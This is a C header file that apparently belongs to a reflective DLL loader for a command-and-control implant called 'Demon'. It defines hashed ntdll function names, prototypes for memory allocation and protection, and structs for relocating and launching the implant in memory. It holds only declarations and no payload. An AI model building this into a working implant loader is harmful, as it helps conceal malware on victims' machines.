
#include <windows.h>
#include <Macro.h>

UINT_PTR GetRIP( VOID );
LPVOID   KaynCaller();
VOID     KaynLdrReloc( PVOID KaynImage, PVOID ImageBase, PVOID BaseRelocDir, DWORD KHdrSize );

#define PAGE_SIZE                       4096
#define MemCopy                         __builtin_memcpy
// Using above HASH_KEY
#define NTDLL_HASH                      0xee229e69 // ntdll.dll

#define SYS_LDRLOADDLL                  0xec0718f7 // LDRLOADDLL
#define SYS_NTALLOCATEVIRTUALMEMORY     0x103b1c13 // NTALLOCATEVIRTUALMEMORY
#define SYS_NTPROTECTEDVIRTUALMEMORY    0x95617115 // NtProtectVirtualMemory

typedef struct {
    WORD offset :12;
    WORD type   :4;
} *PIMAGE_RELOC;

typedef struct
{
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} U_STRING, *PU_STRING;

typedef struct
{
    struct
    {
        UINT_PTR Ntdll;
    } Modules;

    struct {
        NTSTATUS ( NTAPI *LdrLoadDll )(
                PWSTR           DllPath,
                PULONG          DllCharacteristics,
                PU_STRING       DllName,
                PVOID           *DllHandle
        );

        NTSTATUS ( NTAPI *NtAllocateVirtualMemory ) (
                HANDLE      ProcessHandle,
                PVOID       *BaseAddress,
                ULONG_PTR   ZeroBits,
                PSIZE_T     RegionSize,
                ULONG       AllocationType,
                ULONG       Protect
        );

        NTSTATUS ( NTAPI *NtProtectVirtualMemory ) (
                HANDLE  ProcessHandle,
                PVOID   *BaseAddress,
                PSIZE_T RegionSize,
                ULONG   NewProtect,
                PULONG  OldProtect
        );
    } Win32;

} INSTANCE, *PINSTANCE;

#pragma pack(1)
typedef struct
{
    PVOID KaynLdr;
    PVOID DllCopy;
    PVOID Demon;
    DWORD DemonSize;
    PVOID TxtBase;
    DWORD TxtSize;
} KAYN_ARGS, *PKAYN_ARGS;
